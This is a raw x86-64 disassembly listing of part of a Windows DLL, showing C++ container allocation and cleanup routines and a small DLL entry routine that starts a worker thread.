   180001e21:	0f 57 c9             	xorps  %xmm1,%xmm1
   180001e24:	f3 0f 7f 4d d7       	movdqu %xmm1,-0x29(%rbp)
   180001e29:	4c 89 7d e7          	mov    %r15,-0x19(%rbp)
   180001e2d:	48 8b 5d f7          	mov    -0x9(%rbp),%rbx
   180001e31:	48 8b 55 ef          	mov    -0x11(%rbp),%rdx
   180001e35:	48 2b da             	sub    %rdx,%rbx
   180001e38:	48 c1 fb 04          	sar    $0x4,%rbx
   180001e3c:	48 85 db             	test   %rbx,%rbx
   180001e3f:	0f 84 87 00 00 00    	je     0x180001ecc
   180001e45:	49 3b dc             	cmp    %r12,%rbx
   180001e48:	0f 87 2b 03 00 00    	ja     0x180002179
   180001e4e:	48 c1 e3 04          	shl    $0x4,%rbx
   180001e52:	48 85 db             	test   %rbx,%rbx
   180001e55:	75 05                	jne    0x180001e5c
   180001e57:	49 8b ff             	mov    %r15,%rdi
   180001e5a:	eb 41                	jmp    0x180001e9d
   180001e5c:	48 81 fb 00 10 00 00 	cmp    $0x1000,%rbx
   180001e63:	72 29                	jb     0x180001e8e
   180001e65:	48 8d 4b 27          	lea    0x27(%rbx),%rcx
   180001e69:	48 3b cb             	cmp    %rbx,%rcx
   180001e6c:	0f 86 0d 03 00 00    	jbe    0x18000217f
   180001e72:	e8 39 26 00 00       	call   0x1800044b0
   180001e77:	48 85 c0             	test   %rax,%rax
   180001e7a:	0f 84 b7 02 00 00    	je     0x180002137
   180001e80:	48 8d 78 27          	lea    0x27(%rax),%rdi
   180001e84:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   180001e88:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   180001e8c:	eb 0b                	jmp    0x180001e99
   180001e8e:	48 8b cb             	mov    %rbx,%rcx
   180001e91:	e8 1a 26 00 00       	call   0x1800044b0
   180001e96:	48 8b f8             	mov    %rax,%rdi
   180001e99:	48 8b 55 ef          	mov    -0x11(%rbp),%rdx
   180001e9d:	48 89 7d d7          	mov    %rdi,-0x29(%rbp)
   180001ea1:	48 89 7d df          	mov    %rdi,-0x21(%rbp)
   180001ea5:	48 8d 0c 1f          	lea    (%rdi,%rbx,1),%rcx
   180001ea9:	48 89 4d e7          	mov    %rcx,-0x19(%rbp)
   180001ead:	48 8b 5d f7          	mov    -0x9(%rbp),%rbx
   180001eb1:	48 2b da             	sub    %rdx,%rbx
   180001eb4:	4c 8b c3             	mov    %rbx,%r8
   180001eb7:	48 8b cf             	mov    %rdi,%rcx
   180001eba:	e8 2f 37 00 00       	call   0x1800055ee
   180001ebf:	48 83 e3 f0          	and    $0xfffffffffffffff0,%rbx
   180001ec3:	48 03 df             	add    %rdi,%rbx
   180001ec6:	48 89 5d df          	mov    %rbx,-0x21(%rbp)
   180001eca:	eb 04                	jmp    0x180001ed0
   180001ecc:	48 8b 5d df          	mov    -0x21(%rbp),%rbx
   180001ed0:	4c 8b 4d 0f          	mov    0xf(%rbp),%r9
   180001ed4:	4c 8b 45 07          	mov    0x7(%rbp),%r8
   180001ed8:	4d 2b c8             	sub    %r8,%r9
   180001edb:	49 c1 f9 04          	sar    $0x4,%r9
   180001edf:	48 8b d3             	mov    %rbx,%rdx
   180001ee2:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   180001ee6:	e8 05 07 00 00       	call   0x1800025f0
   180001eeb:	4c 8b 35 86 98 00 00 	mov    0x9886(%rip),%r14        # 0x18000b778
   180001ef2:	4d 8b ce             	mov    %r14,%r9
   180001ef5:	48 8b 35 74 98 00 00 	mov    0x9874(%rip),%rsi        # 0x18000b770
   180001efc:	48 8b 5d df          	mov    -0x21(%rbp),%rbx
   180001f00:	48 8b 7d d7          	mov    -0x29(%rbp),%rdi
   180001f04:	49 3b f6             	cmp    %r14,%rsi
   180001f07:	0f 84 81 00 00 00    	je     0x180001f8e
   180001f0d:	0f 1f 00             	nopl   (%rax)
   180001f10:	8b 0e                	mov    (%rsi),%ecx
   180001f12:	48 8b c7             	mov    %rdi,%rax
   180001f15:	48 3b fb             	cmp    %rbx,%rdi
   180001f18:	74 1f                	je     0x180001f39
   180001f1a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180001f20:	39 48 08             	cmp    %ecx,0x8(%rax)
   180001f23:	74 0b                	je     0x180001f30
   180001f25:	48 83 c0 10          	add    $0x10,%rax
   180001f29:	48 3b c3             	cmp    %rbx,%rax
   180001f2c:	75 f2                	jne    0x180001f20
   180001f2e:	eb 09                	jmp    0x180001f39
   180001f30:	48 83 c6 04          	add    $0x4,%rsi
   180001f34:	49 3b f6             	cmp    %r14,%rsi
   180001f37:	75 d7                	jne    0x180001f10
   180001f39:	49 3b f6             	cmp    %r14,%rsi
   180001f3c:	74 50                	je     0x180001f8e
   180001f3e:	48 8d 56 04          	lea    0x4(%rsi),%rdx
   180001f42:	49 3b d6             	cmp    %r14,%rdx
   180001f45:	74 47                	je     0x180001f8e
   180001f47:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180001f4e:	00 00 
   180001f50:	8b 0a                	mov    (%rdx),%ecx
   180001f52:	48 8b c7             	mov    %rdi,%rax
   180001f55:	48 3b fb             	cmp    %rbx,%rdi
   180001f58:	74 24                	je     0x180001f7e
   180001f5a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180001f60:	39 48 08             	cmp    %ecx,0x8(%rax)
   180001f63:	74 0b                	je     0x180001f70
   180001f65:	48 83 c0 10          	add    $0x10,%rax
   180001f69:	48 3b c3             	cmp    %rbx,%rax
   180001f6c:	75 f2                	jne    0x180001f60
   180001f6e:	eb 0e                	jmp    0x180001f7e
   180001f70:	89 0e                	mov    %ecx,(%rsi)
   180001f72:	48 83 c6 04          	add    $0x4,%rsi
   180001f76:	48 8b 5d df          	mov    -0x21(%rbp),%rbx
   180001f7a:	48 8b 7d d7          	mov    -0x29(%rbp),%rdi
   180001f7e:	48 83 c2 04          	add    $0x4,%rdx
   180001f82:	49 3b d6             	cmp    %r14,%rdx
   180001f85:	75 c9                	jne    0x180001f50
   180001f87:	4c 8b 35 ea 97 00 00 	mov    0x97ea(%rip),%r14        # 0x18000b778
   180001f8e:	49 3b f1             	cmp    %r9,%rsi
   180001f91:	74 23                	je     0x180001fb6
   180001f93:	4d 2b f1             	sub    %r9,%r14
   180001f96:	4d 8b c6             	mov    %r14,%r8
   180001f99:	49 8b d1             	mov    %r9,%rdx
   180001f9c:	48 8b ce             	mov    %rsi,%rcx
   180001f9f:	e8 4a 36 00 00       	call   0x1800055ee
   180001fa4:	4c 03 f6             	add    %rsi,%r14
   180001fa7:	4c 89 35 ca 97 00 00 	mov    %r14,0x97ca(%rip)        # 0x18000b778
   180001fae:	48 8b 5d df          	mov    -0x21(%rbp),%rbx
   180001fb2:	48 8b 7d d7          	mov    -0x29(%rbp),%rdi
   180001fb6:	48 3b fb             	cmp    %rbx,%rdi
   180001fb9:	0f 84 99 00 00 00    	je     0x180002058
   180001fbf:	90                   	nop
   180001fc0:	44 8b 47 08          	mov    0x8(%rdi),%r8d
   180001fc4:	49 8b d6             	mov    %r14,%rdx
   180001fc7:	48 8b 0d a2 97 00 00 	mov    0x97a2(%rip),%rcx        # 0x18000b770
   180001fce:	e8 8d 24 00 00       	call   0x180004460
   180001fd3:	48 3b 05 9e 97 00 00 	cmp    0x979e(%rip),%rax        # 0x18000b778
   180001fda:	75 5e                	jne    0x18000203a
   180001fdc:	4c 8b 45 27          	mov    0x27(%rbp),%r8
   180001fe0:	48 8b 55 1f          	mov    0x1f(%rbp),%rdx
   180001fe4:	4c 2b c2             	sub    %rdx,%r8
   180001fe7:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   180001fec:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   180001ff3:	00 
   180001ff4:	c6 44 24 30 01       	movb   $0x1,0x30(%rsp)
   180001ff9:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   180001ffe:	c6 44 24 20 01       	movb   $0x1,0x20(%rsp)
   180002003:	41 b1 01             	mov    $0x1,%r9b
   180002006:	48 8b 0f             	mov    (%rdi),%rcx
   180002009:	e8 62 13 00 00       	call   0x180003370
   18000200e:	84 c0                	test   %al,%al
   180002010:	74 28                	je     0x18000203a
   180002012:	48 8b 15 5f 97 00 00 	mov    0x975f(%rip),%rdx        # 0x18000b778
   180002019:	48 3b 15 60 97 00 00 	cmp    0x9760(%rip),%rdx        # 0x18000b780
   180002020:	74 0f                	je     0x180002031
   180002022:	8b 47 08             	mov    0x8(%rdi),%eax
   180002025:	89 02                	mov    %eax,(%rdx)
   180002027:	48 83 05 49 97 00 00 	addq   $0x4,0x9749(%rip)        # 0x18000b778
   18000202e:	04 
   18000202f:	eb 09                	jmp    0x18000203a
   180002031:	4c 8d 47 08          	lea    0x8(%rdi),%r8
   180002035:	e8 26 0c 00 00       	call   0x180002c60
   18000203a:	48 8b 0f             	mov    (%rdi),%rcx
   18000203d:	ff 15 fd 3f 00 00    	call   *0x3ffd(%rip)        # 0x180006040
   180002043:	48 83 c7 10          	add    $0x10,%rdi
   180002047:	48 3b fb             	cmp    %rbx,%rdi
   18000204a:	74 0c                	je     0x180002058
   18000204c:	4c 8b 35 25 97 00 00 	mov    0x9725(%rip),%r14        # 0x18000b778
   180002053:	e9 68 ff ff ff       	jmp    0x180001fc0
   180002058:	b9 0a 00 00 00       	mov    $0xa,%ecx
   18000205d:	ff 15 bd 3f 00 00    	call   *0x3fbd(%rip)        # 0x180006020
   180002063:	90                   	nop
   180002064:	48 8b 4d d7          	mov    -0x29(%rbp),%rcx
   180002068:	48 85 c9             	test   %rcx,%rcx
   18000206b:	74 41                	je     0x1800020ae
   18000206d:	48 8b 55 e7          	mov    -0x19(%rbp),%rdx
   180002071:	48 2b d1             	sub    %rcx,%rdx
   180002074:	48 83 e2 f0          	and    $0xfffffffffffffff0,%rdx
   180002078:	48 8b c1             	mov    %rcx,%rax
   18000207b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180002082:	72 19                	jb     0x18000209d
   180002084:	48 83 c2 27          	add    $0x27,%rdx
   180002088:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   18000208c:	48 2b c1             	sub    %rcx,%rax
   18000208f:	48 83 e8 08          	sub    $0x8,%rax
   180002093:	48 83 f8 1f          	cmp    $0x1f,%rax
   180002097:	0f 87 9a 00 00 00    	ja     0x180002137
   18000209d:	e8 82 28 00 00       	call   0x180004924
   1800020a2:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800020a5:	f3 0f 7f 45 d7       	movdqu %xmm0,-0x29(%rbp)
   1800020aa:	4c 89 7d e7          	mov    %r15,-0x19(%rbp)
   1800020ae:	48 8b 4d 07          	mov    0x7(%rbp),%rcx
   1800020b2:	48 85 c9             	test   %rcx,%rcx
   1800020b5:	74 3d                	je     0x1800020f4
   1800020b7:	48 8b 55 17          	mov    0x17(%rbp),%rdx
   1800020bb:	48 2b d1             	sub    %rcx,%rdx
   1800020be:	48 83 e2 f0          	and    $0xfffffffffffffff0,%rdx
   1800020c2:	48 8b c1             	mov    %rcx,%rax
   1800020c5:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800020cc:	72 15                	jb     0x1800020e3
   1800020ce:	48 83 c2 27          	add    $0x27,%rdx
   1800020d2:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800020d6:	48 2b c1             	sub    %rcx,%rax
   1800020d9:	48 83 e8 08          	sub    $0x8,%rax
   1800020dd:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800020e1:	77 6a                	ja     0x18000214d
   1800020e3:	e8 3c 28 00 00       	call   0x180004924
   1800020e8:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800020eb:	f3 0f 7f 45 07       	movdqu %xmm0,0x7(%rbp)
   1800020f0:	4c 89 7d 17          	mov    %r15,0x17(%rbp)
   1800020f4:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   1800020f8:	48 85 c9             	test   %rcx,%rcx
   1800020fb:	0f 84 f2 fc ff ff    	je     0x180001df3
   180002101:	48 8b 55 ff          	mov    -0x1(%rbp),%rdx
   180002105:	48 2b d1             	sub    %rcx,%rdx
   180002108:	48 83 e2 f0          	and    $0xfffffffffffffff0,%rdx
   18000210c:	48 8b c1             	mov    %rcx,%rax
   18000210f:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180002116:	72 15                	jb     0x18000212d
   180002118:	48 83 c2 27          	add    $0x27,%rdx
   18000211c:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   180002120:	48 2b c1             	sub    %rcx,%rax
   180002123:	48 83 e8 08          	sub    $0x8,%rax
   180002127:	48 83 f8 1f          	cmp    $0x1f,%rax
   18000212b:	77 36                	ja     0x180002163
   18000212d:	e8 f2 27 00 00       	call   0x180004924
   180002132:	e9 bc fc ff ff       	jmp    0x180001df3
   180002137:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   18000213c:	45 33 c9             	xor    %r9d,%r9d
   18000213f:	45 33 c0             	xor    %r8d,%r8d
   180002142:	33 d2                	xor    %edx,%edx
   180002144:	33 c9                	xor    %ecx,%ecx
   180002146:	ff 15 f4 40 00 00    	call   *0x40f4(%rip)        # 0x180006240
   18000214c:	90                   	nop
   18000214d:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   180002152:	45 33 c9             	xor    %r9d,%r9d
   180002155:	45 33 c0             	xor    %r8d,%r8d
   180002158:	33 d2                	xor    %edx,%edx
   18000215a:	33 c9                	xor    %ecx,%ecx
   18000215c:	ff 15 de 40 00 00    	call   *0x40de(%rip)        # 0x180006240
   180002162:	90                   	nop
   180002163:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   180002168:	45 33 c9             	xor    %r9d,%r9d
   18000216b:	45 33 c0             	xor    %r8d,%r8d
   18000216e:	33 d2                	xor    %edx,%edx
   180002170:	33 c9                	xor    %ecx,%ecx
   180002172:	ff 15 c8 40 00 00    	call   *0x40c8(%rip)        # 0x180006240
   180002178:	90                   	nop
   180002179:	e8 32 11 00 00       	call   0x1800032b0
   18000217e:	cc                   	int3
   18000217f:	e8 9c f1 ff ff       	call   0x180001320
   180002184:	cc                   	int3
   180002185:	cc                   	int3
   180002186:	cc                   	int3
   180002187:	cc                   	int3
   180002188:	cc                   	int3
   180002189:	cc                   	int3
   18000218a:	cc                   	int3
   18000218b:	cc                   	int3
   18000218c:	cc                   	int3
   18000218d:	cc                   	int3
   18000218e:	cc                   	int3
   18000218f:	cc                   	int3
   180002190:	48 83 ec 38          	sub    $0x38,%rsp
   180002194:	83 fa 01             	cmp    $0x1,%edx
   180002197:	75 1f                	jne    0x1800021b8
   180002199:	33 c0                	xor    %eax,%eax
   18000219b:	4c 8d 05 ce fa ff ff 	lea    -0x532(%rip),%r8        # 0x180001c70
   1800021a2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800021a7:	45 33 c9             	xor    %r9d,%r9d
   1800021aa:	33 d2                	xor    %edx,%edx
   1800021ac:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1800021b0:	33 c9                	xor    %ecx,%ecx
   1800021b2:	ff 15 90 3e 00 00    	call   *0x3e90(%rip)        # 0x180006048
   1800021b8:	b8 01 00 00 00       	mov    $0x1,%eax
   1800021bd:	48 83 c4 38          	add    $0x38,%rsp
   1800021c1:	c3                   	ret
   1800021c2:	cc                   	int3
   1800021c3:	cc                   	int3
   1800021c4:	cc                   	int3
   1800021c5:	cc                   	int3
   1800021c6:	cc                   	int3
   1800021c7:	cc                   	int3
   1800021c8:	cc                   	int3
   1800021c9:	cc                   	int3
   1800021ca:	cc                   	int3
   1800021cb:	cc                   	int3
   1800021cc:	cc                   	int3
   1800021cd:	cc                   	int3
   1800021ce:	cc                   	int3
   1800021cf:	cc                   	int3
   1800021d0:	40 53                	rex push %rbx
   1800021d2:	48 83 ec 30          	sub    $0x30,%rsp
   1800021d6:	48 8b d9             	mov    %rcx,%rbx
   1800021d9:	48 8b 09             	mov    (%rcx),%rcx
   1800021dc:	48 85 c9             	test   %rcx,%rcx
   1800021df:	74 3e                	je     0x18000221f
   1800021e1:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   1800021e5:	48 2b d1             	sub    %rcx,%rdx
   1800021e8:	48 83 e2 f0          	and    $0xfffffffffffffff0,%rdx
   1800021ec:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800021f3:	72 18                	jb     0x18000220d
   1800021f5:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   1800021f9:	48 83 c2 27          	add    $0x27,%rdx
   1800021fd:	48 2b c8             	sub    %rax,%rcx
   180002200:	48 83 e9 08          	sub    $0x8,%rcx
   180002204:	48 83 f9 1f          	cmp    $0x1f,%rcx
   180002208:	77 1b                	ja     0x180002225
   18000220a:	48 8b c8             	mov    %rax,%rcx
   18000220d:	e8 12 27 00 00       	call   0x180004924
   180002212:	33 c0                	xor    %eax,%eax
   180002214:	48 89 03             	mov    %rax,(%rbx)
   180002217:	48 89 43 08          	mov    %rax,0x8(%rbx)
   18000221b:	48 89 43 10          	mov    %rax,0x10(%rbx)
   18000221f:	48 83 c4 30          	add    $0x30,%rsp
   180002223:	5b                   	pop    %rbx
   180002224:	c3                   	ret
   180002225:	33 c0                	xor    %eax,%eax
   180002227:	45 33 c9             	xor    %r9d,%r9d
   18000222a:	45 33 c0             	xor    %r8d,%r8d
   18000222d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002232:	33 d2                	xor    %edx,%edx
   180002234:	33 c9                	xor    %ecx,%ecx
   180002236:	ff 15 04 40 00 00    	call   *0x4004(%rip)        # 0x180006240
   18000223c:	cc                   	int3
   18000223d:	cc                   	int3
   18000223e:	cc                   	int3
   18000223f:	cc                   	int3
   180002240:	40 53                	rex push %rbx
   180002242:	48 83 ec 30          	sub    $0x30,%rsp
   180002246:	48 8b d9             	mov    %rcx,%rbx
   180002249:	48 8b 09             	mov    (%rcx),%rcx
   18000224c:	48 85 c9             	test   %rcx,%rcx
   18000224f:	74 3a                	je     0x18000228b
   180002251:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   180002255:	48 2b d1             	sub    %rcx,%rdx
   180002258:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   18000225f:	72 18                	jb     0x180002279
   180002261:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   180002265:	48 83 c2 27          	add    $0x27,%rdx
   180002269:	48 2b c8             	sub    %rax,%rcx
   18000226c:	48 83 e9 08          	sub    $0x8,%rcx
   180002270:	48 83 f9 1f          	cmp    $0x1f,%rcx
   180002274:	77 1b                	ja     0x180002291
   180002276:	48 8b c8             	mov    %rax,%rcx
   180002279:	e8 a6 26 00 00       	call   0x180004924
   18000227e:	33 c0                	xor    %eax,%eax
   180002280:	48 89 03             	mov    %rax,(%rbx)
   180002283:	48 89 43 08          	mov    %rax,0x8(%rbx)
   180002287:	48 89 43 10          	mov    %rax,0x10(%rbx)
   18000228b:	48 83 c4 30          	add    $0x30,%rsp
   18000228f:	5b                   	pop    %rbx
   180002290:	c3                   	ret
   180002291:	33 c0                	xor    %eax,%eax
   180002293:	45 33 c9             	xor    %r9d,%r9d
   180002296:	45 33 c0             	xor    %r8d,%r8d
   180002299:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000229e:	33 d2                	xor    %edx,%edx
   1800022a0:	33 c9                	xor    %ecx,%ecx
   1800022a2:	ff 15 98 3f 00 00    	call   *0x3f98(%rip)        # 0x180006240
   1800022a8:	cc                   	int3
   1800022a9:	cc                   	int3
   1800022aa:	cc                   	int3
   1800022ab:	cc                   	int3
   1800022ac:	cc                   	int3
   1800022ad:	cc                   	int3
   1800022ae:	cc                   	int3
   1800022af:	cc                   	int3
   1800022b0:	40 53                	rex push %rbx
   1800022b2:	48 83 ec 30          	sub    $0x30,%rsp
   1800022b6:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   1800022ba:	48 8b d9             	mov    %rcx,%rbx
   1800022bd:	48 83 fa 07          	cmp    $0x7,%rdx
   1800022c1:	76 31                	jbe    0x1800022f4
   1800022c3:	48 8b 09             	mov    (%rcx),%rcx
   1800022c6:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1800022cd:	00 
   1800022ce:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800022d5:	72 18                	jb     0x1800022ef
   1800022d7:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   1800022db:	48 83 c2 27          	add    $0x27,%rdx
   1800022df:	48 2b c8             	sub    %rax,%rcx
   1800022e2:	48 83 e9 08          	sub    $0x8,%rcx
   1800022e6:	48 83 f9 1f          	cmp    $0x1f,%rcx
   1800022ea:	77 1f                	ja     0x18000230b
   1800022ec:	48 8b c8             	mov    %rax,%rcx
   1800022ef:	e8 30 26 00 00       	call   0x180004924
   1800022f4:	33 c0                	xor    %eax,%eax
   1800022f6:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   1800022fd:	00 
   1800022fe:	48 89 43 10          	mov    %rax,0x10(%rbx)
   180002302:	66 89 03             	mov    %ax,(%rbx)
   180002305:	48 83 c4 30          	add    $0x30,%rsp
   180002309:	5b                   	pop    %rbx
   18000230a:	c3                   	ret
   18000230b:	33 c0                	xor    %eax,%eax
   18000230d:	45 33 c9             	xor    %r9d,%r9d
   180002310:	45 33 c0             	xor    %r8d,%r8d
   180002313:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002318:	33 d2                	xor    %edx,%edx
   18000231a:	33 c9                	xor    %ecx,%ecx
   18000231c:	ff 15 1e 3f 00 00    	call   *0x3f1e(%rip)        # 0x180006240
   180002322:	cc                   	int3
   180002323:	cc                   	int3
   180002324:	cc                   	int3
   180002325:	cc                   	int3
   180002326:	cc                   	int3
   180002327:	cc                   	int3
   180002328:	cc                   	int3
   180002329:	cc                   	int3
   18000232a:	cc                   	int3
   18000232b:	cc                   	int3
   18000232c:	cc                   	int3
   18000232d:	cc                   	int3
   18000232e:	cc                   	int3
   18000232f:	cc                   	int3
   180002330:	40 53                	rex push %rbx
   180002332:	48 83 ec 30          	sub    $0x30,%rsp
   180002336:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   18000233a:	48 8b d9             	mov    %rcx,%rbx
   18000233d:	48 83 fa 0f          	cmp    $0xf,%rdx
   180002341:	76 2c                	jbe    0x18000236f
   180002343:	48 8b 09             	mov    (%rcx),%rcx
   180002346:	48 ff c2             	inc    %rdx
   180002349:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180002350:	72 18                	jb     0x18000236a
   180002352:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   180002356:	48 83 c2 27          	add    $0x27,%rdx
   18000235a:	48 2b c8             	sub    %rax,%rcx
   18000235d:	48 83 e9 08          	sub    $0x8,%rcx
   180002361:	48 83 f9 1f          	cmp    $0x1f,%rcx
   180002365:	77 21                	ja     0x180002388
   180002367:	48 8b c8             	mov    %rax,%rcx
   18000236a:	e8 b5 25 00 00       	call   0x180004924
   18000236f:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
   180002376:	00 
   180002377:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   18000237e:	00 
   18000237f:	c6 03 00             	movb   $0x0,(%rbx)
   180002382:	48 83 c4 30          	add    $0x30,%rsp
   180002386:	5b                   	pop    %rbx
   180002387:	c3                   	ret
   180002388:	45 33 c9             	xor    %r9d,%r9d
   18000238b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   180002392:	00 00 
   180002394:	45 33 c0             	xor    %r8d,%r8d
   180002397:	33 d2                	xor    %edx,%edx
   180002399:	33 c9                	xor    %ecx,%ecx
   18000239b:	ff 15 9f 3e 00 00    	call   *0x3e9f(%rip)        # 0x180006240
   1800023a1:	cc                   	int3
   1800023a2:	cc                   	int3
   1800023a3:	cc                   	int3
   1800023a4:	cc                   	int3
   1800023a5:	cc                   	int3
   1800023a6:	cc                   	int3
   1800023a7:	cc                   	int3
   1800023a8:	cc                   	int3
   1800023a9:	cc                   	int3
   1800023aa:	cc                   	int3
   1800023ab:	cc                   	int3
   1800023ac:	cc                   	int3
   1800023ad:	cc                   	int3
   1800023ae:	cc                   	int3
   1800023af:	cc                   	int3
   1800023b0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800023b5:	55                   	push   %rbp
   1800023b6:	56                   	push   %rsi
   1800023b7:	57                   	push   %rdi
   1800023b8:	41 54                	push   %r12
   1800023ba:	41 55                	push   %r13
   1800023bc:	41 56                	push   %r14
   1800023be:	41 57                	push   %r15
   1800023c0:	48 83 ec 50          	sub    $0x50,%rsp
   1800023c4:	4d 8b f1             	mov    %r9,%r14
   1800023c7:	4d 8b e0             	mov    %r8,%r12
   1800023ca:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
   1800023cf:	48 8b da             	mov    %rdx,%rbx
   1800023d2:	4c 8b f9             	mov    %rcx,%r15
   1800023d5:	48 8b 39             	mov    (%rcx),%rdi
   1800023d8:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   1800023dd:	48 8b 69 08          	mov    0x8(%rcx),%rbp
   1800023e1:	4d 85 c9             	test   %r9,%r9
   1800023e4:	0f 84 e0 01 00 00    	je     0x1800025ca
   1800023ea:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   1800023ee:	48 8b c1             	mov    %rcx,%rax
   1800023f1:	48 2b c5             	sub    %rbp,%rax
   1800023f4:	4c 3b c8             	cmp    %rax,%r9
   1800023f7:	0f 86 5d 01 00 00    	jbe    0x18000255a
   1800023fd:	4c 8b e5             	mov    %rbp,%r12
   180002400:	4c 2b e7             	sub    %rdi,%r12
   180002403:	48 be ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rsi
   18000240a:	ff ff 7f 
   18000240d:	48 8b c6             	mov    %rsi,%rax
   180002410:	49 2b c4             	sub    %r12,%rax
   180002413:	4c 3b c8             	cmp    %rax,%r9
   180002416:	0f 87 c6 01 00 00    	ja     0x1800025e2
   18000241c:	4f 8d 04 21          	lea    (%r9,%r12,1),%r8
   180002420:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   180002425:	48 2b cf             	sub    %rdi,%rcx
   180002428:	48 8b d1             	mov    %rcx,%rdx
   18000242b:	48 d1 ea             	shr    $1,%rdx
   18000242e:	48 8b c6             	mov    %rsi,%rax
   180002431:	48 2b c2             	sub    %rdx,%rax
   180002434:	48 3b c8             	cmp    %rax,%rcx
   180002437:	76 26                	jbe    0x18000245f
   180002439:	48 b9 26 00 00 00 00 	movabs $0x8000000000000026,%rcx
   180002440:	00 00 80 
   180002443:	e8 68 20 00 00       	call   0x1800044b0
   180002448:	48 85 c0             	test   %rax,%rax
   18000244b:	0f 84 ef 00 00 00    	je     0x180002540
   180002451:	48 8d 78 27          	lea    0x27(%rax),%rdi
   180002455:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   180002459:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   18000245d:	eb 3a                	jmp    0x180002499
   18000245f:	48 8d 04 0a          	lea    (%rdx,%rcx,1),%rax
   180002463:	49 8b f0             	mov    %r8,%rsi
   180002466:	49 3b c0             	cmp    %r8,%rax
   180002469:	48 0f 43 f0          	cmovae %rax,%rsi
   18000246d:	48 85 f6             	test   %rsi,%rsi
   180002470:	75 04                	jne    0x180002476
   180002472:	33 ff                	xor    %edi,%edi
   180002474:	eb 23                	jmp    0x180002499
   180002476:	48 81 fe 00 10 00 00 	cmp    $0x1000,%rsi
   18000247d:	72 0f                	jb     0x18000248e
   18000247f:	48 8d 4e 27          	lea    0x27(%rsi),%rcx
   180002483:	48 3b ce             	cmp    %rsi,%rcx
   180002486:	0f 86 5c 01 00 00    	jbe    0x1800025e8
   18000248c:	eb b5                	jmp    0x180002443
   18000248e:	48 8b ce             	mov    %rsi,%rcx
   180002491:	e8 1a 20 00 00       	call   0x1800044b0
   180002496:	48 8b f8             	mov    %rax,%rdi
   180002499:	4c 8b eb             	mov    %rbx,%r13
   18000249c:	4c 2b 6c 24 30       	sub    0x30(%rsp),%r13
   1800024a1:	4a 8d 0c 2f          	lea    (%rdi,%r13,1),%rcx
   1800024a5:	4d 8b c6             	mov    %r14,%r8
   1800024a8:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   1800024ad:	e8 3c 31 00 00       	call   0x1800055ee
   1800024b2:	49 83 fe 01          	cmp    $0x1,%r14
   1800024b6:	75 12                	jne    0x1800024ca
   1800024b8:	48 3b dd             	cmp    %rbp,%rbx
   1800024bb:	75 0d                	jne    0x1800024ca
   1800024bd:	4d 8b c4             	mov    %r12,%r8
   1800024c0:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   1800024c5:	48 8b cf             	mov    %rdi,%rcx
   1800024c8:	eb 20                	jmp    0x1800024ea
   1800024ca:	4d 8b c5             	mov    %r13,%r8
   1800024cd:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   1800024d2:	48 8b cf             	mov    %rdi,%rcx
   1800024d5:	e8 14 31 00 00       	call   0x1800055ee
   1800024da:	48 2b eb             	sub    %rbx,%rbp
   1800024dd:	49 8d 0c 3e          	lea    (%r14,%rdi,1),%rcx
   1800024e1:	49 03 cd             	add    %r13,%rcx
   1800024e4:	4c 8b c5             	mov    %rbp,%r8
   1800024e7:	48 8b d3             	mov    %rbx,%rdx
   1800024ea:	e8 ff 30 00 00       	call   0x1800055ee
   1800024ef:	49 8b 0f             	mov    (%r15),%rcx
   1800024f2:	48 85 c9             	test   %rcx,%rcx
